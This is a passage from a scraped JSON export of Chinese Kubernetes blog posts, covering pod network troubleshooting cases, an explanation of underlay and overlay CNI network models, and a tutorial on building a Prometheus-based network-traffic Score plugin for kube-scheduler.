enp26s0f0上配置了两个IP，如图所示\n图：问题节点IP\n进一步查看网卡配置文件，发现网卡既配置了静态IP，又配置了dhcp动态获取IP。如图所示\n图：问题节点网卡配置\n最终定位原因为问题节点既配置了dhcp 获取IP，又配置了静态IP，导致IP冲突，引发网络异常\n解决方法：修改网卡配置文件 /etc/sysconfig/network-scripts/ifcfg-enp26s0f0 里 BOOTPROTO=\u0026quot;dhcp\u0026quot; 为 BOOTPROTO=\u0026quot;none\u0026quot;；重启 docker 和 kubelet 问题解决。\n集群外云主机调用集群内应用超时 问题现象：Kubernetes 集群外云主机以 http post 方式访问Kubernetes 集群应用接口超时\n环境信息：Kubernetes 集群：calicoIP-IP模式，应用接口以nodeport方式对外提供服务\n客户端：Kubernetes 集群之外的云主机\n排查过程：\n在云主机telnet应用接口地址和端口，可以连通，证明网络连通正常，如图所示\n云主机上调用接口不通，在云主机和Pod所在 Kubernetes节点同时抓包，使用wireshark分析数据包\n通过抓包结果分析结果为TCP链接建立没有问题，但是在传输大数据的时候会一直重传 **1514 **大小的第一个数据包直至超时。怀疑是链路两端MTU大小不一致导致（现象：某一个固定大小的包一直超时的情况）。如图所示，1514大小的包一直在重传。\n报文1-3 TCP三次握手正常\n报文1 info中MSS字段可以看到MSS协商为1460，MTU=1460+20bytes（IP包头）+20bytes（TCP包头）=1500\n报文7 k8s主机确认了包4的数据包，但是后续再没有对数据的ACK\n报文21-29 可以看到云主机一直在发送后面的数据，但是没有收到k8s节点的ACK，结合pod未收到任何报文，表明是k8s节点和POD通信出现了问题。\n图：wireshark分析\n在云主机上使用 ping -s 指定数据包大小，发现超过1400大小的数据包无法正常发送。结合以上情况，定位是云主机网卡配置的MTU是1500，tunl0 配置的MTU是1440，导致大数据包无法发送至 tunl0 ，因此Pod没有收到报文，接口调用失败。\n解决方法：修改云主机网卡MTU值为1440，或者修改calico的MTU值为1500，保持链路两端MTU值一致。\n集群pod访问对象存储超时 环境信息：公有云环境，Kubernetes 集群节点和对象存储在同一私有网络下，网络链路无防火墙限制k8s集群开启了节点自动弹缩（CA）和Pod自动弹缩（HPA），通过域名访问对象存储，Pod使用集群DNS服务，集群DNS服务配置了用户自建上游DNS服务器\n排查过程：\n使用nsenter工具进入pod容器网络命名空间测试，ping对象存储域名不通，报错unknown server name，ping对象存储lP可以连通。\ntelnet 对象存储80/443端口可以连通。\npaping 对象存储 80/443 端口无丢包。\n为了验证Pod创建好以后的初始阶段网络连通性，将以上测试动作写入dockerfile，重新生成容器镜像并创pod，测试结果一致。\n通过上述步骤，判断Pod网络连通性无异常，超时原因为域名解析失败，怀疑问题如下：\n集群DNS服务存在异常 上游DNS服务存在异常 集群DNS服务与上游DNS通讯异常 pod访问集群DNS服务异常 根据上述方向排查，集群DNS服务状态正常，无报错。测试Pod分别使用集群DNS服务和上游DNS服务解析域名，前者解析失败，后者解析成功。至此，证明上游DNS服务正常，并且集群DNS服务日志中没有与上游DNS通讯超时的报错。定位到的问题：==Pod访问集群DNS服务超时==\n此时发现，出现问题的Pod集中在新弹出的 Kubernetes 节点上。这些节点的 kube-proxy Pod状态全部为pending，没有正常调度到节点上。因此导致该节点上其他Pod无法访问包括 dns 在内的所有Kubernetes service。\n再进一步排查发现 kube-proxy Pod没有配置priorityclass为最高优先级，导致节点资源紧张时为了将高优先级的应用Pod调度到该节点，将原本已运行在该节点的kube-proxy驱逐。\n解决方法：将 kube-proxy 设置 priorityclass 值为 system-node-critical 最高优先级，同时建议应用Pod配置就绪探针，测试可以正常连通对象存储域名后再分配任务。\nReference [1] A tcpdump Tutorial with Examples\n[2] How to install nsenter\n[3] man nsenter\n","permalink":"https://www.oomkill.com/2022/08/pod-network-troubleshooting/","summary":"","title":"Kubernetes Pod网络排错思路"},{"content":"Overview 本文将深入探讨Kubernetes中的网络模型，以及对各种网络模型进行分析。\nUnderlay Network Model 什么是Underlay Network 底层网络 Underlay Network 顾名思义是指网络设备基础设施，如交换机，路由器, DWDM 使用网络介质将其链接成的物理网络拓扑，负责网络之间的数据包传输。\n图：Underlay network topology Source：https://community.cisco.com/t5/data-center-switches/understanding-underlay-and-overlay-networks/td-p/4295870\nunderlay network 可以是二层，也可以是三层；二层 underlay network 的典型例子是以太网 Ethernet，三层是 underlay network 的典型例子是互联网 Internet。\n而工作与二层的技术是 vlan，工作在三层的技术是由 OSPF, BGP 等协议组成\nkubernetes中的underlay network 在kubernetes中，underlay network 是将宿主机作为路由器设备而，Pod 的网络则通过学习成路由条目从而实现跨节点通讯。\n图：underlay network topology in kubernetes\n这种模型下典型的有 flannel 的 host-gw 模式与 calico BGP 模式。\nflannel host-gw [1] flannel host-gw 模式中每个Node需要在同一个二层网络中，并将Node作为一个路由器，跨节点通讯将通过路由表方式进行，这样方式下将网络模拟成一个underlay network。\n图：layer2 ethernet topology Source：https://www.auvik.com/franklyit/blog/layer-3-switches-layer-2/\nNotes：因为是通过路由方式，集群的cidr至少要配置16，因为这样可以保证，跨节点的Node作为一层网络，同节点的Pod作为一个网络。如果不是这种用情况，路由表处于相同的网络中，会存在网络不可达\nCalico BGP [2] BGP（Border Gateway Protocol）是去中心化自治路由协议。它是通过维护IP路由表或\u0026rsquo;前缀\u0026rsquo;表来实现AS （Autonomous System）之间的可访问性，属于向量路由协议。\n图：BGP network topology Source：https://infocenter.nokia.com/public/7705SAR214R1A/index.jsp?topic=%2Fcom.sar.routing_protocols%\n与 flannel 不同的是，Calico 提供了的 BGP 网络解决方案，在网络模型上，Calico 与 Flannel host-gw 是近似的，但在软件架构的实现上，flannel 使用 flanneld 进程来维护路由信息；而 Calico 是包含多个守护进程的，其中 Brid 进程是一个 BGP 的客户端 与路由反射器(Router Reflector)，BGP 客户端负责从 Felix 中获取路由并分发到其他 BGP Peer，而反射器在BGP中起了优化的作用。在同一个IBGP中，BGP客户端仅需要和一个 RR 相连，这样减少了AS内部维护的大量的BGP连接。通常情况下，RR 是真实的路由设备，而 Bird 作为 BGP 客户端工作。\n图：Calico Network Architecture Source：https://www.cisco.com/c/en/us/td/docs/dcn/whitepapers/cisco-nx-os-calico-network-design.html\nIPVLAN \u0026amp; MACVLAN [4] IPVLAN 和 MACVLAN 是一种网卡虚拟化技术，两者之间的区别为， IPVLAN 允许一个物理网卡拥有多个IP地址，并且所有的虚拟接口用同一个MAC地址；而 MACVLAN 则是相反的，其允许同一个网卡拥有多个MAC地址，而虚拟出的网卡可以没有IP地址。\n因为是网卡虚拟化技术，而不是网络虚拟化技术，本质上来说属于 Overlay network，这种方式在虚拟化环境中与Overlay network 相比最大的特点就是可以将Pod的网络拉平到Node网络同级，从而提供更高的性能、低延迟的网络接口。本质上来说其网络模型属于下图中第二个。\n虚拟网桥：创建一个虚拟网卡对(veth pair)，一头栽容器内，一头栽宿主机的root namespaces内。这样一来容器内发出的数据包可以通过网桥直接进入宿主机网络栈，而发往容器的数据包也可以经过网桥进入容器。 多路复用：使用一个中间网络设备，暴露多个虚拟网卡接口，容器网卡都可以介入这个中间设备，并通过MAC/IP地址来区分packet应该发往哪个容器设备。 硬件交换，为每个Pod分配一个虚拟网卡，这样一来，Pod与Pod之间的连接关系就会变得非常清晰，因为近乎物理机之间的通信基础。如今大多数网卡都支持SR-IOV功能，该功能将单一的物理网卡虚拟成多个VF接口，每个VF接口都有单独的虚拟PCIe通道，这些虚拟的PCIe通道共用物理网卡的PCIe通道。 图：Virtual networking modes: bridging, multiplexing and SR-IOV Source：https://thenewstack.io/hackers-guide-kubernetes-networking/\n在kubernetes中 IPVLAN 这种网络模型下典型的CNI有，multus 与 danm。\nmultus multus 是 intel 开源的CNI方案，是由传统的 cni 与 multus，并且提供了 SR-IOV CNI 插件使 K8s pod 能够连接到 SR-IOV VF 。这是使用了 IPVLAN/MACVLAN 的功能。\n当创建新的Pod后，SR-IOV 插件开始工作。配置 VF 将被移动到新的 CNI 名称空间。该插件根据 CNI 配置文件中的 “name” 选项设置接口名称。最后将VF状态设置为UP。\n下图是一个 Multus 和 SR-IOV CNI 插件的网络环境，具有三个接口的 pod。\neth0 是 flannel 网络插件，也是作为Pod的默认网络 VF 是主机的物理端口 ens2f0 的实例化。这是英特尔X710-DA4上的一个端口。 在Pod端的 VF 接口名称为 south0 。 这个VF使用了 DPDK 驱动程序，此 VF 是从主机的物理端口 ens2f1 实例化出的。这个是英特尔® X710-DA4上另外一个端口。 Pod 内的 VF 接口名称为 north0。该接口绑定到 DPDK 驱动程序 vfio-pci 。 图：Mutus networking Architecture overlay and SR-IOV Source：https://builders.intel.com/docs/networkbuilders/enabling_new_features_in_kubernetes_for_NFV.pdf\nNotes：terminology\nNIC：network interface card，网卡 SR-IOV：single root I/O virtualization，硬件实现的功能，允许各虚拟机间共享PCIe设备。 VF：Virtual Function，基于PF，与PF或者其他VF共享一个物理资源。 PF：PCIe Physical Function，拥有完全控制PCIe资源的能力 DPDK：Data Plane Development Kit 于此同时，也可以将主机接口直接移动到Pod的网络名称空间，当然这个接口是必须存在，并且不能是与默认网络使用同一个接口。这种情况下，在普通网卡的环境中，就直接将Pod网络与Node网络处于同一个平面内了。\n图：Mutus networking Architecture overlay and ipvlan Source：https://devopstales.github.io/kubernetes/multus/\ndanm DANM是诺基亚开源的CNI项目，目的是将电信级网络引入kubernetes中，与multus相同的是，也提供了SR-IOV/DPDK 的硬件技术，并且支持IPVLAN.\nOverlay Network Model 什么是Overlay 叠加网络是使用网络虚拟化技术，在 underlay 网络上构建出的虚拟逻辑网络，而无需对物理网络架构进行更改。本质上来说，overlay network 使用的是一种或多种隧道协议 (tunneling)，通过将数据包封装，实现一个网络到另一个网络中的传输，具体来说隧道协议关注的是数据包（帧）。\n图：overlay network topology Source：https://www.researchgate.net/figure/Example-Overlay-Network-built-on-top-of-an-Internet-style-Underlay_fig4_230774628\n常见的网络隧道技术 通用路由封装 ( Generic Routing Encapsulation ) 用于将来自 IPv4/IPv6的数据包封装为另一个协议的数据包中，通常工作与L3网络层中。 VxLAN (Virtual Extensible LAN)，是一个简单的隧道协议，本质上是将L2的以太网帧封装为L4中UDP数据包的方法，使用 4789 作为默认端口。VxLAN 也是 VLAN 的扩展对于 4096（$2^{12}$ 位 VLAN ID） 扩展为1600万（$2^{24}$ 位 VNID ）个逻辑网络。 这种工作在 overlay 模型下典型的有 flannel 与 calico 中的的 VxLAN, IPIP 模式。\nIPIP IP in IP 也是一种隧道协议，与 VxLAN 类似的是，IPIP 的实现也是通过Linux内核功能进行的封装。IPIP 需要内核模块 ipip.ko 使用命令查看内核是否加载IPIP模块lsmod | grep ipip ；使用命令modprobe ipip 加载。\n图：A simple IPIP network workflow Source：https://ssup2.github.io/theory_analysis/IPIP_GRE_Tunneling/\nKubernetes中 IPIP 与 VxLAN 类似，也是通过网络隧道技术实现的。与 VxLAN 差别就是，VxLAN 本质上是一个 UDP包，而 IPIP 则是将包封装在本身的报文包上。\n图：IPIP in kubernetes\n图：IPIP packet with wireshark unpack\nNotes：公有云可能不允许IPIP流量，例如Azure\nVxLAN kubernetes中不管是 flannel 还是 calico VxLAN的实现都是使用Linux内核功能进行的封装，Linux 对 vxlan 协议的支持时间并不久，2012 年 Stephen Hemminger 才把相关的工作合并到 kernel 中，并最终出现在 kernel 3.7.0 版本。为了稳定性和很多的功能，你可以会看到某些软件推荐在 3.9.0 或者 3.10.0 以后版本的 kernel 上使用 VxLAN。\n图：A simple VxLAN network topology\n在kubernetes中vxlan网络，例如 flannel，守护进程会根据kubernetes的Node而维护 VxLAN，名称为 flannel.1 这是 VNID，并维护这个网络的路由，当发生跨节点的流量时，本地会维护对端 VxLAN 设备的MAC地址，通过这个地址可以知道发送的目的端，这样就可以封包发送到对端，收到包的对端 VxLAN设备 flannel.1 解包后得到真实的目的地址。\n查看 Forwarding database 列表\n$ bridge fdb 26:5e:87:90:91:fc dev flannel.1 dst 10.0.0.3 self permanent 图：VxLAN in kubernetes\n图：VxLAN packet with wireshark unpack\nNotes：VxLAN使用的4789端口，wireshark应该是根据端口进行分析协议的，而flannel在linux中默认端口是8472，此时抓包仅能看到是一个UDP包。\n通过上述的架构可以看出，隧道实际上是一个抽象的概念，并不是建立的真实的两端的隧道，而是通过将数据包封装成另一个数据包，通过物理设备传输后，经由相同的设备（网络隧道）进行解包实现网络的叠加。\nweave vxlan [3] weave也是使用了 VxLAN 技术完成的包的封装，这个技术在 weave 中称之为 fastdp (fast data path)，与 calico 和 flannel 中用到的技术不同的，这里使用的是 Linux 内核中的 openvswitch datapath module。与其他的 VxLAN 模型不同的是，weave对网络流量进行了加密。\n图：weave fastdp network topology Source：https://www.weave.works/docs/net/latest/concepts/fastdp-how-it-works/\nNotes：fastdp工作在Linux 内核版本 3.12 及更高版本，如果低于此版本的例如CentOS7，weave将工作在用户空间，weave中称之为 sleeve mode\nReference\n[1] flannel host-gw\n[2] calico bgp networking\n[3] calico bgp networking\n[4] sriov network\n[5] danm\n","permalink":"https://www.oomkill.com/2022/08/kubernetes-network-model/","summary":"","title":"详述Kubernetes网络模型"},{"content":"Overview 本文将深入讲解 如何扩展 Kubernetes scheduler 中各个扩展点如何使用，与扩展scheduler的原理，这些是作为扩展 scheduler 的所需的知识点。最后会完成一个实验，基于网络流量的调度器。\nkubernetes调度配置 kubernetes集群中允许运行多个不同的 scheduler ，也可以为Pod指定不同的调度器进行调度。在一般的Kubernetes调度教程中并没有提到这点，这也就是说，对于亲和性，污点等策略实际上并没有完全的使用kubernetes调度功能，在之前的文章中提到的一些调度插件，如基于端口占用的调度 NodePorts 等策略一般情况下是没有使用到的，本章节就是对这部分内容进行讲解，这也是作为扩展调度器的一个基础。\nScheduler Configuration [1] kube-scheduler 提供了配置文件的资源，作为给 kube-scheduler 的配置文件，启动时通过 --onfig= 来指定文件。目前各个kubernetes版本中使用的 KubeSchedulerConfiguration 为，\n1.21 之前版本使用 v1beta1 1.22 版本使用 v1beta2 ，但保留了 v1beta1 1.23, 1.24, 1.25 版本使用 v1beta3 ，但保留了 v1beta2，删除了 v1beta1 下面是一个简单的 kubeSchedulerConfiguration 示例，其中 kubeconfig 与启动参数 --kubeconfig 是相同的功效。而 kubeSchedulerConfiguration 与其他组件的配置文件类似，如 kubeletConfiguration 都是作为服务启动的配置文件。\napiVersion: kubescheduler.config.k8s.io/v1beta1 kind: KubeSchedulerConfiguration clientConnection: kubeconfig: /etc/srv/kubernetes/kube-scheduler/kubeconfig Notes: --kubeconfig 与 --config 是不可以同时指定的，指定了 --config 则其他参数自然失效 [2]\nkubeSchedulerConfiguration使用 通过配置文件，用户可以自定义多个调度器，以及配置每个阶段的扩展点。而插件就是通过这些扩展点来提供在整个调度上下文中的调度行为。\n下面配置是对于配置扩展点的部分的一个示例，关于扩展点的讲解可以参考kubernetes官方文档调度上下文部分\napiVersion: kubescheduler.config.k8s.io/v1beta1 kind: KubeSchedulerConfiguration profiles: - plugins: score: disabled: - name: PodTopologySpread enabled: - name: MyCustomPluginA weight: 2 - name: MyCustomPluginB weight: 1 Notes: 如果name=\u0026quot;*\u0026quot; 的话，这种情况下将禁用/启用对应扩展点的所有插件\n既然kubernetes提供了多调度器，那么对于配置文件来说自然支持多个配置文件，profile也是列表形式，只要指定多个配置列表即可，下面是多配置文件示例，其中，如果存在多个扩展点，也可以为每个调度器配置多个扩展点。\napiVersion: kubescheduler.config.k8s.io/v1beta2 kind: KubeSchedulerConfiguration profiles: - schedulerName: default-scheduler plugins: preScore: disabled: - name: '*' score: disabled: - name: '*' - schedulerName: no-scoring-scheduler plugins: preScore: disabled: - name: '*' score: disabled: - name: '*' scheduler调度插件 [3] kube-scheduler 默认提供了很多插件作为调度方法，默认不配置的情况下会启用这些插件，如：\nImageLocality：调度将更偏向于Node存在容器镜像的节点。扩展点：score. TaintToleration：实现污点与容忍度功能。扩展点：filter, preScore, score. NodeName：实现调度策略中最简单的调度方法 NodeName 的实现。扩展点：filter. NodePorts：调度将检查Node端口是否已占用。扩展点：preFilter, filter. NodeAffinity：提供节点亲和性相关功能。扩展点：filter, score. PodTopologySpread：实现Pod拓扑域的功能。扩展点：preFilter, filter, preScore, score. NodeResourcesFit：该插件将检查节点是否拥有 Pod 请求的所有资源。使用以下三种策略之一：LeastAllocated （默认）MostAllocated 和 RequestedToCapacityRatio。扩展点：preFilter, filter, score. VolumeBinding：检查节点是否有或是否可以绑定请求的 卷. 扩展点：preFilter, filter, reserve, preBind, score. VolumeRestrictions：检查安装在节点中的卷是否满足特定于卷提供程序的限制。扩展点：filter. VolumeZone：检查请求的卷是否满足它们可能具有的任何区域要求。扩展点：filter. InterPodAffinity： 实现Pod 间的亲和性与反亲和性的功能。扩展点：preFilter, filter, preScore, score. PrioritySort：提供基于默认优先级的排序。扩展点：queueSort. 对于更多配置文件使用案例可以参考官方给出的文档\n如何扩展kube-scheduler [4] 当在第一次考虑编写调度程序时，通常会认为扩展 kube-scheduler 是一件非常困难的事情，其实这些事情 kubernetes 官方早就想到了，kubernetes为此在 1.15 版本引入了framework的概念，framework旨在使 scheduler 更具有扩展性。\nframework 通过重新定义 各扩展点，将其作为 plugins 来使用，并且支持用户注册 out of tree 的扩展，使其可以被注册到 kube-scheduler 中，下面将对这些步骤进行分析。\n定义入口 scheduler 允许进行自定义，但是对于只需要引用对应的 NewSchedulerCommand，并且实现自己的 plugins 的逻辑即可。\nimport ( scheduler \u0026quot;k8s.io/kubernetes/cmd/kube-scheduler/app\u0026quot; ) func main() { command := scheduler.NewSchedulerCommand( scheduler.WithPlugin(\u0026quot;example-plugin1\u0026quot;, ExamplePlugin1), scheduler.WithPlugin(\u0026quot;example-plugin2\u0026quot;, ExamplePlugin2)) if err := command.Execute(); err != nil { fmt.Fprintf(os.Stderr, \u0026quot;%v\\n\u0026quot;, err) os.Exit(1) } } 而 NewSchedulerCommand 允许注入 out of tree plugins，也就是注入外部的自定义 plugins，这种情况下就无需通过修改源码方式去定义一个调度器，而仅仅通过自行实现即可完成一个自定义调度器。\n// WithPlugin 用于注入out of tree plugins 因此scheduler代码中没有其引用。 func WithPlugin(name string, factory runtime.PluginFactory) Option { return func(registry runtime.Registry) error { return registry.Register(name, factory) } } 插件实现 对于插件的实现仅仅需要实现对应的扩展点接口。下面通过内置插件进行分析\n对于内置插件 NodeAffinity ,我们通过观察他的结构可以发现，实现插件就是实现对应的扩展点抽象 interface 即可。\n定义插件结构体 其中 framework.FrameworkHandle 是提供了Kubernetes API与 scheduler 之间调用使用的，通过结构可以看出包含 lister，informer等等，这个参数也是必须要实现的。\ntype NodeAffinity struct { handle framework.FrameworkHandle } 实现对应的扩展点 func (pl *NodeAffinity) Score(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeName string) (int64, *framework.Status) { nodeInfo, err := pl.handle.SnapshotSharedLister().NodeInfos().Get(nodeName) if err != nil { return 0, framework.NewStatus(framework.Error, fmt.Sprintf(\u0026quot;getting node %q from Snapshot: %v\u0026quot;, nodeName, err)) } node := nodeInfo.Node() if node == nil { return 0, framework.NewStatus(framework.Error, fmt.Sprintf(\u0026quot;getting node %q from Snapshot: %v\u0026quot;, nodeName, err)) } affinity := pod.Spec.Affinity var count int64 // A nil element of PreferredDuringSchedulingIgnoredDuringExecution matches no objects. // An element of PreferredDuringSchedulingIgnoredDuringExecution that refers to an // empty PreferredSchedulingTerm matches all objects. if affinity != nil \u0026amp;\u0026amp; affinity.NodeAffinity != nil \u0026amp;\u0026amp; affinity.NodeAffinity.PreferredDuringSchedulingIgnoredDuringExecution != nil { // Match PreferredDuringSchedulingIgnoredDuringExecution term by term. for i := range affinity.NodeAffinity.PreferredDuringSchedulingIgnoredDuringExecution { preferredSchedulingTerm := \u0026amp;affinity.NodeAffinity.PreferredDuringSchedulingIgnoredDuringExecution[i] if preferredSchedulingTerm.Weight == 0 { continue } // TODO: Avoid computing it for all nodes if this becomes a performance problem. nodeSelector, err := v1helper.NodeSelectorRequirementsAsSelector(preferredSchedulingTerm.Preference.MatchExpressions) if err != nil { return 0, framework.NewStatus(framework.Error, err.Error()) } if nodeSelector.Matches(labels.Set(node.Labels)) { count += int64(preferredSchedulingTerm.Weight) } } } return count, nil } 最后在通过实现一个 New 函数来提供注册这个扩展的方法。通过这个 New 函数可以在 main.go 中将其作为 out of tree plugins 注入到 scheduler 中即可\n// New initializes a new plugin and returns it. func New(_ runtime.Object, h framework.FrameworkHandle) (framework.Plugin, error) { return \u0026amp;NodeAffinity{handle: h}, nil } 实验：基于网络流量的调度 [7] 通过上面阅读了解到了如何扩展 scheduler 插件，下面实验将完成一个基于流量的调度，通常情况下，网络一个Node在一段时间内使用的网络流量也是作为生产环境中很常见的情况。例如在配置均衡的多个主机中，主机A作为业务拉单脚本运行，主机B作为计算服务运行。通常来说计算服务会使用更多的系统资源，而拉单需要更多的是网络流量，此时在调度时，默认调度器有限选择的是系统空闲资源多的节点，这种情况下如果有Pod被调度到该节点上，那么可能双方业务都会收到影响（前端代理觉得这个节点连接数少会被大量调度，而拉单脚本因为网络带宽的占用降低了效能）。\n实验环境 一个kubernetes集群，至少保证有两个节点。 提供的kubernetes集群都需要安装prometheus node_exporter，可以是集群内部的，也可以是集群外部的，这里使用的是集群外部的。 对 promQL 与 client_golang 有所了解 实验大致分为以下几个步骤：\n定义插件API 插件命名为 NetworkTraffic 定义扩展点 这里使用了 Score 扩展点，并且定义评分的算法 定义分数获取途径（从prometheus指标中拿到对应的数据） 定义对自定义调度器的参数传入 将项目部署到集群中（集群内部署与集群外部署） 实验的结果验证 实验将仿照内置插件 nodeaffinity 完成代码编写，为什么选择这个插件，只是因为这个插件相对比较简单，并且与我们实验目的基本相同，其实其他插件也是同样的效果。\n整个实验的代码上传至 github.com/CylonChau/customScheduler\n实验开始 错误处理 在初始化项目时，go mod tidy 等操作时，会遇到大量下面的错误\ngo: github.com/GoogleCloudPlatform/spark-on-k8s-operator@v0.0.0-20210307184338-1947244ce5f4 requires k8s.io/apiextensions-apiserver@v0.0.0: reading k8s.io/apiextensions-apiserver/go.mod at revision v0.0.0: unknown revision v0.0.0 kubernetes issue #79384 [5] 中有提到这个问题，粗略浏览下没有说明为什么会出现这个问题，在最下方有个大佬提供了一个脚本，出现上述问题无法解决时直接运行该脚本后正常。\n#!/bin/sh set -euo pipefail VERSION=${1#\u0026quot;v\u0026quot;} if [ -z \u0026quot;$VERSION\u0026quot; ]; then echo \u0026quot;Must specify version!\u0026quot; exit 1 fi MODS=($( curl -sS https://raw.githubusercontent.com/kubernetes/kubernetes/v${VERSION}/go.mod | sed -n 's|.*k8s.io/\\(.*\\) =\u0026gt; ./staging/src/k8s.io/.*|k8s.io/\\1|p' )) for MOD in \u0026quot;${MODS[@]}\u0026quot;; do V=$( go mod download -json \u0026quot;${MOD}@kubernetes-${VERSION}\u0026quot; | sed -n 's|.*\u0026quot;Version\u0026quot;: \u0026quot;\\(.*\\)\u0026quot;.*|\\1|p' ) go mod edit \u0026quot;-replace=${MOD}=${MOD}@${V}\u0026quot; done go get \u0026quot;k8s.io/kubernetes@v${VERSION}\u0026quot; 定义插件API 通过上面内容描述了解到了定义插件只需要实现对应的扩展点抽象 interface ，那么可以初始化项目目录 pkg/networtraffic/networktraffice.go。\n定义插件名称与变量\nconst Name = \u0026quot;NetworkTraffic\u0026quot; var _ = framework.ScorePlugin(\u0026amp;NetworkTraffic{}) 定义插件的结构体\ntype NetworkTraffic struct { // 这个作为后面获取node网络流量使用 prometheus *PrometheusHandle // FrameworkHandle 提供插件可以使用的数据和一些工具。 // 它在插件初始化时传递给 plugin 工厂类。 // plugin 必须存储和使用这个handle来调用framework函数。 handle framework.FrameworkHandle } 定义扩展点 因为选用 Score 扩展点，需要定义对应的方法，来实现对应的抽象\nfunc (n *NetworkTraffic) Score(ctx context.Context, state *framework.CycleState, p *corev1.Pod, nodeName string) (int64, *framework.Status) { // 通过promethes拿到一段时间的node的网络使用情况 nodeBandwidth, err := n.prometheus.GetGauge(nodeName) if err != nil { return 0, framework.NewStatus(framework.Error, fmt.Sprintf(\u0026quot;error getting node bandwidth measure: %s\u0026quot;, err)) } bandWidth := int64(nodeBandwidth.Value) klog.Infof(\u0026quot;[NetworkTraffic] node '%s' bandwidth: %s\u0026quot;, nodeName, bandWidth) return bandWidth, nil // 这里直接返回就行 } 接下来需要对结果归一化，这里就回到了调度框架中扩展点的执行问题上了，通过源码可以看出，Score 扩展点需要实现的并不只是这单一的方法。\n// Run NormalizeScore method for each ScorePlugin in parallel. parallelize.Until(ctx, len(f.scorePlugins), func(index int) { pl := f.scorePlugins[index] nodeScoreList := pluginToNodeScores[pl.Name()] if pl.ScoreExtensions() == nil { return } status := f.runScoreExtension(ctx, pl, state, pod, nodeScoreList) if !status.IsSuccess() { err := fmt.Errorf(\u0026quot;normalize score plugin %q failed with error %v\u0026quot;, pl.Name(), status.Message()) errCh.SendErrorWithCancel(err, cancel) return } }) 通过上面代码了解到，实现 Score 就必须实现 ScoreExtensions，如果没有实现则直接返回。而根据 nodeaffinity 中示例发现这个方法仅仅返回的是这个扩展点对象本身，而具体的归一化也就是真正进行打分的操作在 NormalizeScore 中。\n// NormalizeScore invoked after scoring all nodes. func (pl *NodeAffinity) NormalizeScore(ctx context.Context, state *framework.CycleState, pod *v1.Pod, scores framework.NodeScoreList) *framework.Status { return pluginhelper.DefaultNormalizeScore(framework.MaxNodeScore, false, scores) } // ScoreExtensions of the Score plugin. func (pl *NodeAffinity) ScoreExtensions() framework.ScoreExtensions { return pl } 而在 framework 中，真正执行的操作的方法也是 NormalizeScore()\nfunc (f *frameworkImpl) runScoreExtension(ctx context.Context, pl framework.ScorePlugin, state *framework.CycleState, pod *v1.Pod, nodeScoreList framework.NodeScoreList) *framework.Status { if !state.ShouldRecordPluginMetrics() { return pl.ScoreExtensions().NormalizeScore(ctx, state, pod, nodeScoreList) } startTime := time.Now() status := pl.ScoreExtensions().NormalizeScore(ctx, state, pod, nodeScoreList) f.metricsRecorder.observePluginDurationAsync(scoreExtensionNormalize, pl.Name(), status, metrics.SinceInSeconds(startTime)) return status } 下面来实现对应的方法\n在 NormalizeScore 中需要实现具体的选择node的算法，因为对node打分结果的区间为 $[0,100]$ ，所以这里实现的算法公式将为 $最高分 - (当前带宽 / 最高最高带宽 * 100)$，这样就保证了，带宽占用越大的机器，分数越低。\n例如，最高带宽为200000，而当前Node带宽为140000，那么这个Node分数为：$max - \\frac{140000}{200000}\\times 100 = 100 - (0.7\\times100)=30$\n// 如果返回framework.ScoreExtensions 就需要实现framework.ScoreExtensions func (n *NetworkTraffic) ScoreExtensions() framework.ScoreExtensions { return n } // NormalizeScore与ScoreExtensions是固定格式 func (n *NetworkTraffic) NormalizeScore(ctx context.Context, state *framework.CycleState, pod *corev1.Pod, scores framework.NodeScoreList) *framework.Status { var higherScore int64 for _, node := range scores { if higherScore \u0026lt; node.Score { higherScore = node.Score } } // 计算公式为，满分 - (当前带宽 / 最高最高带宽 * 100) // 公式的计算结果为，带宽占用越大的机器，分数越低 for i, node := range scores { scores[i].Score = framework.MaxNodeScore - (node.Score * 100 / higherScore) klog.Infof(\u0026quot;[NetworkTraffic] Nodes final score: %v\u0026quot;, scores) } klog.Infof(\u0026quot;[NetworkTraffic] Nodes final score: %v\u0026quot;, scores) return nil } Notes：在kubernetes中最大的node数支持5000个，岂不是在获取最大分数时循环就占用了大量的性能，其实不必担心。scheduler 提供了一个参数 percentageOfNodesToScore。这个参数决定了这里要循环的数量。更多的细节可以参考官方文档对这部分的说明 [6]\n配置插件名称\n为了使插件注册时候使用，还需要为其配置一个名称\n// Name returns name of the plugin. It is used in logs, etc. func (n *NetworkTraffic) Name() string { return Name } 定义PrometheusHandle 网络插件的扩展中还存在一个 prometheusHandle，这个就是操作prometheus-server拿去指标的动作。\n首先需要定义一个 PrometheusHandle 的结构体\ntype PrometheusHandle struct { deviceName string // 网络接口名称 timeRange time.Duration // 抓取的时间段 ip string // prometheus server的连接地址 client v1.API // 操作prometheus的客户端 } 有了结构就需要查询的动作和指标，对于指标来说，这里使用了 node_network_receive_bytes_total 作为获取Node的网络流量的计算方式。由于环境是部署在集群之外的，没有node的主机名，通过 promQL 获取，整个语句如下：\nsum_over_time(node_network_receive_bytes_total{device=\u0026quot;eth0\u0026quot;}[1s]) * on(instance) group_left(nodename) (node_uname_info{nodename=\u0026quot;node01\u0026quot;}) 整个 Prometheus 部分如下：\ntype PrometheusHandle struct { deviceName string timeRange time.Duration ip string client v1.API } func NewProme(ip, deviceName string, timeRace time.Duration) *PrometheusHandle { client, err := api.NewClient(api.Config{Address: ip}) if err != nil { klog.Fatalf(\u0026quot;[NetworkTraffic] FatalError creating prometheus client: %s\u0026quot;, err.Error()) } return \u0026amp;PrometheusHandle{ deviceName: deviceName, ip: ip, timeRange: timeRace, client: v1.NewAPI(client), } } func (p *PrometheusHandle) GetGauge(node string) (*model.Sample, error) { value, err := p.query(fmt.Sprintf(nodeMeasureQueryTemplate, node, p.deviceName, p.timeRange)) fmt.Println(fmt.Sprintf(nodeMeasureQueryTemplate, p.deviceName, p.timeRange, node)) if err != nil { return nil, fmt.Errorf(\u0026quot;[NetworkTraffic] Error querying prometheus: %w\u0026quot;, err) } nodeMeasure := value.(model.Vector) if len(nodeMeasure) != 1 { return nil, fmt.Errorf(\u0026quot;[NetworkTraffic] Invalid response, expected 1 value, got %d\u0026quot;, len(nodeMeasure)) } return nodeMeasure[0], nil } func (p *PrometheusHandle) query(promQL string) (model.Value, error) { // 通过promQL查询并返回结果 results, warnings, err := p.client.Query(context.Background(), promQL, time.Now()) if len(warnings) \u0026gt; 0 { klog.Warningf(\u0026quot;[NetworkTraffic Plugin] Warnings: %v\\n\u0026quot;, warnings) } return results, err } 定义调度器传入的参数 因为需要指定 prometheus 